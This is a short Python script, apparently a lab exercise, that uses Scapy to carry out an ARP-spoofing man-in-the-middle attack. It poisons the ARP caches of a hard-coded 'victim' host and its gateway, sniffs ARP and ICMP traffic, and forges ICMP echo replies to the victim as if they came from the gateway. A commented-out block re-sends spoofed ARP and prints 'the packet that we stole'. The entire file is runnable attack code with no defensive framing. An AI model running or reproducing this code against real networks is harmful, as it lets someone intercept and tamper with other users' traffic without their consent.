from scapy.all import *

victim_ip = "192.168.8.10"
gateway_ip = "192.168.8.1"

victim_mac = getmacbyip(victim_ip) # get the mac address with arp 
gateway_mac = getmacbyip(gateway_ip) # get the mac address with arp 

arp_victim = ARP(op = 2,pdst = victim_ip ,hwdst = victim_mac,psrc = gateway_ip)
arp_gateway = ARP(op = 2,pdst = gateway_ip,hwdst = gateway_mac,psrc = victim_ip)

send(arp_victim)
send(arp_gateway)

time.sleep(2)

def arp_mitm_spoof(pkt):
    try:
        if pkt[IP].src == victim_ip and pkt.haslayer(ICMP):
            icmp = pkt.getlayer(ICMP)
            if icmp.type == 8:
                icmp_reply = ICMP(type = 0,code = 0, id=icmp.id,seq = icmp.seq)/Raw(load=icmp.load)
                ip_reply = IP(src=gateway_ip,dst = victim_ip)/icmp_reply
                send(ip_reply)
                print("ICMP echo reply sent")
                '''spoofed_pkt = Ether(dst = victim_mac)/ARP(op = 2, psrc =gateway_ip, pdst = victim_ip, hwdst = victim_mac)
                sendp(spoofed_pkt)
                print("ARP sent to the victim machine")
                print("Original ping from victim to gateway:")
                print(pkt.show()) for send arp to the victim and print the packet that we stole'''
    except Exception as e:
        print("Error processing packet : {}".format(e))
sniff(filter="arp or icmp", prn = arp_mitm_spoof)
